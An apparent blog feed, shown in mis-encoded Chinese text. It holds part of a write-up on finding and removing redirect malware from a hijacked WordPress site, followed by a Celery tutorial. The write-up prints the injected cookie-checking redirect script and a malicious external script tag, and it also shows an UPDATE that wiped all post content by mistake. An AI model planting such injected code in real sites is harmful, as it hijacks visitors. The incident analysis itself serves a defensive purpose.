<li><p>é‚£ä¹ˆå›åˆ°ç½‘ç»œè¢«é»‘çš„å¯èƒ½å», è¿™é‡Œæœ‰ä¸ªç–‘é—®, ä¸ºä»€ä¹ˆæˆ‘ä»¬è®¿é—®ç½‘ç«™ä¸ä¼šè¢«è·³è½¬, è¿™ä¸ªæ˜¯å’Œæ‰€å¤„çš„ç½‘ç»œæœ‰å…³å—?<br>ä¸€å¼€å§‹ä¹Ÿå¾ˆç–‘æƒ‘, ä½†åæ¥å…¬å¸æœ‰äººè®¿é—®é¡µé¢ä¹Ÿè¢«è·³è½¬å, æˆ‘æ‰å‘ç°å¿½ç•¥äº†ä¸€ä¸ªå¾ˆé‡è¦çš„ä¸œè¥¿--ç¼“å­˜.</p>
</li>
</ol>
</li>
<li><p>ç­”æ¡ˆç¡®è®¤äº†--ç½‘ç«™è¢«é»‘, é‚£æ¥ä¸‹æ¥æ­£å¼è§£å†³é—®é¢˜.</p>
</li>
</ol>
<h2 id="å®šä½æ¶æ„ä»£ç "><a href="#å®šä½æ¶æ„ä»£ç " class="headerlink" title="å®šä½æ¶æ„ä»£ç "></a>å®šä½æ¶æ„ä»£ç </h2><blockquote>
<p>æ¡èµ·è€æœ¬è¡Œ(é€†å‘), åˆ†æä¸€æ³¢ç½‘ç»œè¯·æ±‚å…ˆ, å¾ˆè½»æ¾çš„å°±æ‰¾åˆ°æ¶æ„ä»£ç .</p>
</blockquote>
<p>é¦–å…ˆ, æœç´¢ä¸€å¼€å§‹è·³è½¬çš„åŸŸå, æ‰¾åˆ°è¯¥è¯·æ±‚, å¹¶æ²¡æœ‰å¾—åˆ°æœ‰ä»·å€¼çš„ä¿¡æ¯, æˆ‘ä»¬éœ€è¦æ‰¾åˆ°å‘èµ·è¯¥è¯·æ±‚çš„åœ°æ–¹.</p>
<p><img data-src="http://img.owq.world/2022/06/1101-32167f.png"></p>
<p>è¿™æ—¶è§‚å¯Ÿä¸€ä¸‹ç½‘ç»œæ¡, å‘ç°æœ‰ä¸ªåœ°æ–¹å­˜åœ¨å¼‚å¸¸, è¯·æ±‚äº†å…¶å®ƒåŸŸå, å› ä¸ºç½‘ç«™åªè¿æ¥äº†ä¸€ä¸ªåŸŸå, æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥æ˜¯åªæœ‰ä¸€æ¡çº¿.</p>
<p><img data-src="http://img.owq.world/2022/06/1100-a0d616.png"></p>
<p>è®©æˆ‘ä»¬é€‰ä¸­è¿™ä¸ªå¼‚å¸¸çš„ç½‘ç»œå—, è·³åˆ°å‘èµ·çš„è¯·æ±‚çœ‹çœ‹.</p>
<p><img data-src="http://img.owq.world/2022/06/1117-719ccf.png"></p>
<p>ç‚¹å¼€é‡Œé¢çš„å†…å®¹ä¸€çœ‹, æœä¸å…¶ç„¶, è¿™ä¸€æ®µå¤©ä¹¦èˆ¬çš„ä»£ç , å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„ä¸œè¥¿äº†.</p>
<p><img data-src="http://img.owq.world/2022/06/1116-1922b9.png"></p>
<hr>
<blockquote>
<p>è¿™ä¸€æ®µæ˜¯å¤ç›˜çš„æ—¶å€™åŠ ä¸Šå»çš„.</p>
</blockquote>
<p>è¿™é‡Œæ‰‹åŠ¨ç¿»è¯‘äº†ä¸‹, æ˜¯ä¸€æ®µé‡å®šå‘ä»£ç , é¡ºä¾¿æœç´¢äº†ä¸‹é‡Œé¢å‡ºç°æœ€å¤šçš„<code>wordpress_p_seo_adminos</code>, æ¨æµ‹è·Ÿ<code>p_seo_adminos</code>è¿™ä¸ªWPæ’ä»¶æœ‰å…³.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params">e,t,o</span>)&#123;<span class="keyword">var</span> n=<span class="string">&quot;&quot;</span>;<span class="keyword">if</span>(o)&#123;<span class="keyword">var</span> i=<span class="keyword">new</span> <span class="title class_">Date</span>;i.<span class="title function_">setTime</span>(i.<span class="title function_">getTime</span>()+<span class="number">24</span>*o*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1e3</span>),n=<span class="string">&quot;; expires=&quot;</span>+i.<span class="title function_">toUTCString</span>()&#125;<span class="variable language_">document</span>.<span class="property">cookie</span>=e+<span class="string">&quot;=&quot;</span>+(t||<span class="string">&quot;&quot;</span>)+n+<span class="string">&quot;; path=/&quot;</span>&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getCookie</span>(<span class="params">e</span>)&#123;<span class="keyword">for</span>(<span class="keyword">var</span> t=e+<span class="string">&quot;=&quot;</span>,o=<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&quot;;&quot;</span>),n=<span class="number">0</span>;n&lt;o.<span class="property">length</span>;n++)&#123;<span class="keyword">for</span>(<span class="keyword">var</span> i=o[n];<span class="string">&quot; &quot;</span>==i.<span class="title function_">charAt</span>(<span class="number">0</span>);)i=i.<span class="title function_">substring</span>(<span class="number">1</span>,i.<span class="property">length</span>);<span class="keyword">if</span>(<span class="number">0</span>==i.<span class="title function_">indexOf</span>(t))<span class="keyword">return</span> i.<span class="title function_">substring</span>(t.<span class="property">length</span>,i.<span class="property">length</span>)&#125;<span class="keyword">return</span> <span class="literal">null</span>&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getLoggedInCookie</span>(<span class="params"></span>)&#123;<span class="keyword">return</span> <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;wp-settings-time&quot;</span>)&gt;-<span class="number">1</span>?<span class="number">1</span>:<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;logged_in&quot;</span>)&gt;-<span class="number">1</span>?<span class="number">1</span>:<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;wpsetts-cookie&quot;</span>)&gt;-<span class="number">1</span>?<span class="number">1</span>:<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;wordpress_p_seo_adminos&quot;</span>)&gt;-<span class="number">1</span>?<span class="number">1</span>:<span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">goaweway</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> newv = <span class="string">&#x27;https://front.greengoplatform.com/go.php?lid=3337&amp;pid=9646&amp;cid=114733&#x27;</span>;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=newv;<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=newv;&#125;<span class="keyword">if</span>(<span class="title function_">getLoggedInCookie</span>()==<span class="number">1</span>)&#123;<span class="title function_">setCookie</span>(<span class="string">&quot;wordpress_p_seo_adminos&quot;</span>,<span class="number">1</span>,<span class="number">30</span>);&#125;<span class="keyword">else</span>&#123;<span class="title function_">goaweway</span>();&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>æ¥ä¸‹æ¥è¯¥æ€ä¹ˆåŠ? æ¯•ç«Ÿå’±å¯¹<code>WordPress</code>å¹¶ä¸æ˜¯å¾ˆç†Ÿæ‚‰, æ‰€ä»¥å€ŸåŠ©ä¸‹æœç´¢å¼•æ“çš„åŠ›é‡, æ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« .</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9yZW1vdGVyZXNjdWUubmV0L3dvcmRwcmVzcy1yZWRpcmVjdGluZy10by1sZWdlbmRhcnl0YWJsZS1jb20v">How to remove legendarytable.com redirect malware - Remote Rescue</span></p>
</blockquote>
<p>è¿™ç¯‡æ–‡ç« åˆšå¥½ä¹Ÿæ˜¯ç½‘ç«™è¢«åŠ«æŒçš„é‚£æ®µæ—¶é—´å‘å‡ºçš„, ç¡®è®¤æ˜¯åŒä¸€ç§æƒ…å†µå, å’±æ ¹æ®æ–‡ç« æ•™ç¨‹è¿›è¡Œè§£å†³å°±è¡Œ.</p>
<h2 id="å¤„ç†æ¶æ„æ’ä»¶"><a href="#å¤„ç†æ¶æ„æ’ä»¶" class="headerlink" title="å¤„ç†æ¶æ„æ’ä»¶"></a>å¤„ç†æ¶æ„æ’ä»¶</h2><blockquote>
<p>è¿™é‡Œé€šè¿‡å…³é”®å­—æœç´¢æ¶æ„æ’ä»¶åæ— æœå, ç›´æ¥æŠŠç½‘ç«™ä¸Šçœ‹èµ·æ¥çš„&quot;å¥‡å¥‡æ€ªæ€ª&quot;æ’ä»¶éƒ½ç»™æ¸…äº†, åé¢ä¹Ÿæ²¡æœ‰å¤å‘, ç®€å•åˆçœäº‹~</p>
</blockquote>
<h2 id="æ¸…é™¤æ¶æ„ä»£ç "><a href="#æ¸…é™¤æ¶æ„ä»£ç " class="headerlink" title="æ¸…é™¤æ¶æ„ä»£ç "></a>æ¸…é™¤æ¶æ„ä»£ç </h2><p>é¡ºè—¤æ‘¸ç“œ, æ‰¾åˆ°DB.<code>wp_posts</code>é‡Œçš„æ¶æ„ä»£ç , è¿™é‡Œä½¿ç”¨<code>phpMyAdmin</code>å»è¿æ¥(é€šè¿‡WPæ’ä»¶).</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=â€™text/javascriptâ€™ src=â€™<span class="attr">https</span>:<span class="comment">//trend.linetoadsactive.com/m.js?n=ns1â€²&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="http://img.owq.world/2022/06/1125-160779.png"></p>
<p>ç„¶è€Œ, åœ¨æ—¶é—´æ€¥è¿«çš„æƒ…å†µä¸‹(è¿˜æœ‰å…¶å®ƒäº‹æƒ…è¦åš), ä»¥åŠç¿»äº†å¥½å‡ é¡µéƒ½æ˜¯ç›¸åŒå†…å®¹çš„è¯¯å¯¼ä¸­, ç›´æ¥ä½¿ç”¨<code>UPDATE wp_posts SET post_content = &quot;&quot;</code>è¯­å¥(çœŸæ˜¯ä¸ªå¤§èªæ˜).<br>ç»“æœ, <code>post_content</code> è¢«æ¸…ç©ºäº†, é¡µé¢å†…å®¹è¢«æ¸…ç©º...</p>
<h2 id="å›æ»šæ•°æ®"><a href="#å›æ»šæ•°æ®" class="headerlink" title="å›æ»šæ•°æ®"></a>å›æ»šæ•°æ®</h2><blockquote>
<p>å‚è€ƒæ–‡ç« : <span class="exturl" data-url="aHR0cHM6Ly93d3cucGNoNTIwLmNvbS9hcnRpY2xlLzM2">https://www.pch520.com/article/36</span></p>
</blockquote>
<ul>
<li><p>å…ˆæŸ¥çœ‹<code>binlog</code>æ—¥å¿—å¼€äº†æ²¡, <code>log_bin=ON</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;log_bin&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å†çœ‹çœ‹é…ç½®æ˜¯å¦æ­£ç¡®, <code>binlog_format=ROW</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> &quot;binlog%&quot;;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>å¾ˆå¥½, å‰ææ¡ä»¶éƒ½å…·å¤‡äº†, é‚£ä¹ˆå¯¼å‡ºæ‰§è¡ŒæŸ¥è¯¢è¯­å¥çš„é‚£ä¸€æ®µæ—¶é—´çš„æ—¥å¿—</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysqlbinlog &lt;log_path&gt;/mysql-bin.000087 --start-datetime=<span class="string">&#x27;2022-05-17 15:00:00&#x27;</span> --stop-datetime=<span class="string">&#x27;2022-05-17 16:00:00&#x27;</span> &gt; ~/mysql-bin.sql</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥, å†™ä¸€æ®µPythonè„šæœ¬, ç”Ÿæˆå›æ»šSQL, é¡ºä¾¿æŠŠæ¶æ„ä»£ç ä¹Ÿæ¸…äº†, æœ€ç»ˆ, é—®é¢˜è§£å†³~</p>
<blockquote>
<p>æœ€å, æ•°æ®æ— ä»·, æ“ä½œéœ€è°¨æ…( â€¢Ì€ .Ì« â€¢Ì )</p>
</blockquote>
]]></content>
      <categories>
        <category>æŠ€æœ¯è®°å½•</category>
      </categories>
      <tags>
        <tag>WordPress</tag>
      </tags>
  </entry>
  <entry>
    <title>Celery å¿«é€Ÿä¸Šæ‰‹æŒ‡å—-Pythonç¯‡</title>
    <url>/73d2d4df/</url>
    <content><![CDATA[<blockquote>
<p>Github -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NlbGVyeS9jZWxlcnk=">https://github.com/celery/celery</span><br>Docs   -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmNlbGVyeXEuZGV2L2VuL3N0YWJsZS9pbmRleC5odG1s">https://docs.celeryq.dev/en/stable/index.html</span></p>
</blockquote>
<h2 id="ç®€å•äº†è§£"><a href="#ç®€å•äº†è§£" class="headerlink" title="ç®€å•äº†è§£"></a>ç®€å•äº†è§£</h2><ul>
<li>Celery æ˜¯ä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡é˜Ÿåˆ—, ç”¨äºåˆ†å¸ƒå¼è°ƒåº¦ä»»åŠ¡</li>
<li>ç»„ä»¶<ul>
<li>Celery Beat ä»»åŠ¡è°ƒåº¦å™¨<br>ç”¨äºå‘å¸ƒä»»åŠ¡åˆ°ä»»åŠ¡é˜Ÿåˆ—</li>
<li>Celery Workers æ‰§è¡Œä»»åŠ¡çš„æ¶ˆè´¹è€…<br>é»˜è®¤æƒ…å†µä¸‹ Celery ä¼šåœ¨ä¸åŒè¿›ç¨‹æ‰§è¡Œä»»åŠ¡, å¯ä»¥åˆ†å¸ƒåˆ°å¤šå°æœºå™¨</li>
<li>Broker æ¶ˆæ¯ä»£ç†<br>ç”¨æ¥ä¼ é€’ä»»åŠ¡çš„, é€šå¸¸æ­é… <code>RabbitMQ</code> or <code>Redis</code> ä½¿ç”¨</li>
<li>Producer ä»»åŠ¡ç”Ÿäº§è€…<br>è°ƒç”¨Celeryæä¾›çš„APIè¿›è¡Œä»»åŠ¡æ·»åŠ </li>
<li>Result Backend ç»“æœåç«¯<br>ä¿å­˜äº†ä»»åŠ¡ç»“æœä»¥ä¾›æŸ¥è¯¢</li>
</ul>
</li>
</ul>
<p><img data-src="http://img.owq.world/2022/05/1540-a7efa3.png"></p>
<h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> -U Celery</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨ <code>Redis</code> ä½œä¸ºä¼ é€’æ¶ˆæ¯é˜Ÿåˆ—å’Œåç«¯, å¯ä»¥ç›´æ¥å®‰è£…æ†ç»‘åŒ….</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> -U <span class="string">&quot;celery[redis]&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h2><p>åˆ›å»ºæ–‡ä»¶ <code>dome.py</code> å’Œ <code>test.py</code></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ dome.<span class="keyword">py</span></span><br><span class="line">â””â”€â”€ test.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>

<p><strong>dome.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"></span><br><span class="line"><span class="comment"># redis://:password@hostname:port/db_number</span></span><br><span class="line">broker = <span class="string">&#x27;redis://localhost:6379/2&#x27;</span>		<span class="comment"># ä»»åŠ¡é˜Ÿåˆ—</span></span><br><span class="line">backend = <span class="string">&#x27;redis://localhost:6379/3&#x27;</span>	<span class="comment"># åç«¯(å­˜å‚¨ä»»åŠ¡ç»“æœ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”Ÿæˆä»»åŠ¡åçš„å‰ç¼€, ä¸å½±å“åç»­æ“ä½œ</span></span><br><span class="line"><span class="comment"># result_expires å‚æ•°æ˜¯åç«¯ç»“æœä¿å­˜æ—¶é—´</span></span><br><span class="line">app = Celery(<span class="string">&#x27;test&#x27;</span>, broker=broker, backend=backend, result_expires=<span class="number">120</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task	</span><span class="comment"># è£…é¥°addå‡½æ•°æˆä¸º Task å®ä¾‹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait</span>(<span class="params">wait</span>):</span><br><span class="line">    time.sleep(wait)</span><br><span class="line">    <span class="keyword">return</span> wait</span><br></pre></td></tr></table></figure>

<h2 id="è¿è¡ŒCelery"><a href="#è¿è¡ŒCelery" class="headerlink" title="è¿è¡ŒCelery"></a>è¿è¡ŒCelery</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">celery -A dome worker -l info -c 8</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-A</code>: æŒ‡å®šåˆ›å»ºçš„celeryå¯¹è±¡çš„ä½ç½®<br><code>dome</code>é‡Œæœ‰åˆå§‹åŒ–åçš„å®ä¾‹, <code>worker</code>è¡¨ç¤ºè¯¥å®ä¾‹æ˜¯ä»»åŠ¡æ‰§è¡Œè€…</li>
<li><code>-l</code>: è¾“å‡ºçš„æ—¥å¿—ç­‰çº§</li>
<li><code>-c</code>: è¿è¡Œçš„workeræ•°é‡(å¹¶å‘), é»˜è®¤å’ŒCPUæ ¸å¿ƒæ•°ä¸€æ ·</li>
</ul>
<h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><blockquote>
<p>ä»»åŠ¡è°ƒç”¨ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmNlbGVyeXEuZGV2L2VuL3N0YWJsZS91c2VyZ3VpZGUvY2FsbGluZy5odG1s">https://docs.celeryq.dev/en/stable/userguide/calling.html</span></p>
</blockquote>
<p>è¿›å…¥<code>pyhton</code>äº¤äº’æ¨¡å¼æˆ–ç¼–å†™<code>test.py</code>æµ‹è¯•æ–‡ä»¶æµ‹è¯•éƒ½å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dome</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>delay()</code>: ç”¨äºå¼‚æ­¥è°ƒç”¨ä»»åŠ¡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è¿”å›çš„æ˜¯ AsyncResult å®ä¾‹</span></span><br><span class="line">dome.add.delay(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>apply_async()</code>: å’Œ<code>delay()</code>ä½œç”¨ä¸€æ ·, ä½†æ”¯æŒæ›´å¤šæ“ä½œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dome.add.apply_async(args=[<span class="number">1</span>,<span class="number">2</span>])</span><br></pre></td></tr></table></figure>
</li>
<li><p>s()</p>
</li>
<li><p><code>ready()</code>: è¿”å›ä»»åŠ¡å®ŒæˆçŠ¶æ€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result.ready()</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>get()</code>: è·å–ä»»åŠ¡ç»“æœ(æ‰§è¡Œè¿‡ç¨‹æ˜¯é˜»å¡çš„)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è®¾ç½®è¶…æ—¶, è¶…æ—¶æœªå®ŒæˆæŠ›å‡º TimeoutError</span></span><br><span class="line">result.get(timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¿½ç•¥å¼‚å¸¸</span></span><br><span class="line">result.get(propagate=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>traceback</code>: è·å–å¼‚å¸¸, æ— å¼‚å¸¸ä¸º<code>None</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result.traceback</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="æ‰§è¡Œæµç¨‹"><a href="#æ‰§è¡Œæµç¨‹" class="headerlink" title="æ‰§è¡Œæµç¨‹"></a>æ‰§è¡Œæµç¨‹</h2><p>è¿™é‡Œæ·»åŠ ä¸‹100ä¸ªä»»åŠ¡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[dome.wait.delay(<span class="number">60</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶<code>Redis</code>ä¼šå­˜åœ¨3ä¸ªé”®, å®é™…ä¸Šæ‰§è¡Œ<code>dome.add.delay(1,2)</code>ä¹Ÿæœ‰, ä½†ä»»åŠ¡å·²ç»è¢«å–èµ°æ‰§è¡Œäº†, è§‚å¯Ÿä¸åˆ°è¿‡ç¨‹.</p>
<ul>
<li><code>celery</code>: é‡Œé¢å­˜æ”¾çš„æ˜¯å¾…æ‰§è¡Œçš„ä»»åŠ¡é˜Ÿåˆ—</li>
<li><code>unacked</code>: é‡Œé¢æ˜¯å­˜æ”¾çš„å¾…ç¡®è®¤çš„ä»»åŠ¡é˜Ÿåˆ—(å·²è¢«åˆ†é…ç»™<code>Workers</code>çš„ä»»åŠ¡)<br>unacked è¡¨ç¤ºä¸ºæœªæ”¶åˆ°ack(ç¡®è®¤è®¯æ¯)</li>
<li><code>unacked_index</code>: ä¼˜å…ˆé˜Ÿåˆ—, å­˜æ”¾çš„æ˜¯<code>unacked</code>ç›¸åº”çš„ç´¢å¼•</li>
</ul>
<p>ä»»åŠ¡åœ¨ç”Ÿæˆæ—¶ä¼šè¢«æ·»åŠ åˆ°ä»»åŠ¡é˜Ÿåˆ—é‡Œ, è¿™æ—¶ä»»åŠ¡è°ƒåº¦å™¨æ²¡æœ‰è¿è¡Œçš„è¯, ä½ ä¼šçœ‹åˆ°100ä¸ªä»»åŠ¡åœ¨<strong>ä»»åŠ¡é˜Ÿåˆ—</strong>å®‰å®‰é™é™çš„èººç€.</p>
<p>å› ä¸ºç”µè„‘CPUæœ‰16æ ¸, é»˜è®¤ä¼šåˆ›å»º16ä¸ª<code>worker</code>, åœ¨æ·»åŠ å®Œä»»åŠ¡åçš„60ç§’å†…, <code>unacked</code>é‡Œé¢åº”è¯¥æ˜¯å­˜åœ¨ç€64æ¡å¾…ç¡®è®¤ä»»åŠ¡(æ¯ä¸ª<code>worker</code>åˆ†é…5æ¡), è€Œä»»åŠ¡é˜Ÿåˆ—é‡Œé¢æœ‰20æ¡å¾…æ‰§è¡Œä»»åŠ¡, å‰©ä¸‹çš„16æ¡åœ¨<code>worker</code>ä¸­æ‰§è¡Œ.</p>
<p>ä»»åŠ¡æ‰§è¡Œå®Œ, <code>worker</code>ä¼šæ‹¿<code>unacked</code>é‡Œçš„ä»»åŠ¡æ‰§è¡Œ, ä»»åŠ¡é˜Ÿåˆ—é‡Œä¼šç»§ç»­æŠŠä»»åŠ¡åˆ†é…ç»™æœ‰ç©ºé—²çš„<code>worker</code>, ç›´åˆ°ä»»åŠ¡éƒ½æ‰§è¡Œå®Œ.</p>
<p>å¦‚æœå¼ºè¡Œä¸­æ–­ç¨‹åºçš„è¯, <code>unacked</code>é‡Œçš„ä»»åŠ¡ä¼šé‡æ–°è¢«å¡å›ä»»åŠ¡é˜Ÿåˆ—é‡Œé¢, è€Œ<strong>æ­£åœ¨æ‰§è¡Œä¸­ä»»åŠ¡åˆ™ä¼šè¢«ä¸¢å¤±</strong>, è¿™æ˜¯æä¸æ¨èçš„åšæ³•, æ­£ç¡®çš„åšæ³•æ˜¯ç»™<code>celery</code>è¿›ç¨‹å‘é€<code>TERM</code>ä¿¡å·, è¿™æ ·<code>woeker</code>ä¼šç­‰å¾…ä»»åŠ¡å®Œæˆåå†å…³é—­.</p>
<h2 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h2><h3 id="é»˜è®¤ä½¿ç”¨"><a href="#é»˜è®¤ä½¿ç”¨" class="headerlink" title="é»˜è®¤ä½¿ç”¨"></a>é»˜è®¤ä½¿ç”¨</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h3 id="å‚æ•°è¯´æ˜"><a href="#å‚æ•°è¯´æ˜" class="headerlink" title="å‚æ•°è¯´æ˜"></a>å‚æ•°è¯´æ˜</h3><ul>
<li><strong>name</strong>: å¯ä»¥æ˜¾å¼æŒ‡å®šä»»åŠ¡çš„åå­—, é»˜è®¤æ˜¯æ¨¡å—çš„å‘½åç©ºé—´ä¸­æœ¬å‡½æ•°çš„åå­—</li>
<li><strong>serializer</strong>: æŒ‡å®šæœ¬ä»»åŠ¡çš„åºåˆ—åŒ–çš„æ–¹æ³•</li>
<li><strong>bind</strong>: ä¸€ä¸ªboolå€¼, è®¾ç½®æ˜¯å¦ç»‘å®šä¸€ä¸ªtaskçš„å®ä¾‹, å¦‚æœç»‘å®š, taskå®ä¾‹ä¼šä½œä¸ºå‚æ•°ä¼ é€’åˆ°ä»»åŠ¡æ–¹æ³•ä¸­, å¯ä»¥è®¿é—®taskå®ä¾‹çš„æ‰€æœ‰çš„å±æ€§, å³å‰é¢ååºåˆ—åŒ–ä¸­é‚£äº›å±æ€§</li>
<li><strong>base</strong>: å®šä¹‰ä»»åŠ¡çš„åŸºç±», å¯ä»¥ä»¥æ­¤æ¥å®šä¹‰å›è°ƒå‡½æ•°, é»˜è®¤æ˜¯Taskç±»</li>
<li><strong>default_retry_delay</strong>: è®¾ç½®è¯¥ä»»åŠ¡é‡è¯•çš„å»¶è¿Ÿæ—¶é—´, å½“ä»»åŠ¡æ‰§è¡Œå¤±è´¥å, ä¼šè‡ªåŠ¨é‡è¯•, å•ä½æ˜¯ç§’, é»˜è®¤3åˆ†é’Ÿ</li>
<li><strong>autoretry_for</strong>: è®¾ç½®åœ¨ç‰¹å®šå¼‚å¸¸æ—¶é‡è¯•ä»»åŠ¡, é»˜è®¤Falseå³ä¸é‡è¯•</li>
<li><strong>retry_backoff</strong>: é»˜è®¤False, è®¾ç½®é‡è¯•æ—¶çš„å»¶è¿Ÿæ—¶é—´é—´éš”ç­–ç•¥</li>
<li><strong>retry_backoff_max</strong>: è®¾ç½®æœ€å¤§å»¶è¿Ÿé‡è¯•æ—¶é—´, é»˜è®¤10åˆ†é’Ÿ, å¦‚æœå¤±è´¥åˆ™ä¸å†é‡è¯•</li>
<li><strong>retry_jitter</strong>: é»˜è®¤True, å³å¼•å…¥æŠ–åŠ¨, é¿å…é‡è¯•ä»»åŠ¡é›†ä¸­æ‰§è¡Œ</li>
</ul>
<h3 id="å‡½æ•°è¦æ±‚"><a href="#å‡½æ•°è¦æ±‚" class="headerlink" title="å‡½æ•°è¦æ±‚"></a>å‡½æ•°è¦æ±‚</h3><ul>
<li>æ–¹æ³•åº”è¯¥æ˜¯<strong>ç­‰å¹‚çš„</strong><ul>
<li>é»˜è®¤æƒ…å†µä¸‹Celeryä¸ä¼šæ‰§è¡Œä»»ä½•é‡è¯•é€»è¾‘</li>
<li>é‡è¯•çš„è¯éœ€è¦æ ¹æ®Celeryè¯´æ˜é…ç½®</li>
</ul>
</li>
<li>æ¶‰åŠ<code>I/O</code>çš„æ“ä½œåº”è¯¥åšå¥½<strong>è¶…æ—¶å¤„ç†</strong></li>
</ul>
<h3 id="é‡è¯•"><a href="#é‡è¯•" class="headerlink" title="é‡è¯•"></a>é‡è¯•</h3><blockquote>
<p>é”™è¯¯é‡è¯•æœ€å¥½ä¸ç”¨åŠ åœ¨Celeryé‡Œé¢, ä¼šä½¿ç¨‹åºè®¾è®¡å¤æ‚, è€¦åˆåº¦å‡é«˜</p>
</blockquote>
<figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">...</span></span><br></pre></td></tr></table></figure>

<h3 id="å–æ¶ˆä»»åŠ¡"><a href="#å–æ¶ˆä»»åŠ¡" class="headerlink" title="å–æ¶ˆä»»åŠ¡"></a>å–æ¶ˆä»»åŠ¡</h3><h4 id="revoke"><a href="#revoke" class="headerlink" title="revoke()"></a>revoke()</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = add.apply_async(args=[<span class="number">2</span>, <span class="number">2</span>], countdown=<span class="number">120</span>)</span><br><span class="line">result.revoke()</span><br></pre></td></tr></table></figure>

<p><strong>ä½¿ç”¨ä»»åŠ¡idå–æ¶ˆ</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> proj.celery <span class="keyword">import</span> app</span><br><span class="line">app.control.revoke(task_id)</span><br></pre></td></tr></table></figure>

